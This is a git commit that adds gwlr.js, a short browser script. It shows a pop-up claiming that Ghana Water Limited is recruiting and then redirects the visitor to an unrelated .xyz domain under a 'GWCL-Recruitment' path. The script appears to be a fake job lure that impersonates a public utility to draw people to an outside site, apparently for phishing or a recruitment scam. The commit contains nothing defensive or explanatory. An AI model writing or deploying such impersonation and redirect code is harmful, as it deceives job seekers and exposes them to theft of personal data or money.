1a667ab244fb956c19b5e9eb885e66e3c85f5f7c
bigetijazz32 <bigetijazz32@gmail.com>
2025-08-03 10:12:02 +0100

    Create gwlr.js

---
+++ gwlr.js
@@ -0,0 +1,6 @@
+
+var password = 'Ghana Water Ltd Recruitment'
+password=prompt('NOTICE: Ghana Water Limited is currently recruiting, press OK to apply for the','Ghana Water Ltd Recruitment');
+if (password != 'Ghana Water Ltd Recruitment') {
+location.href='https://www.udwang.xyz/GWCL-Recruitment';
+}
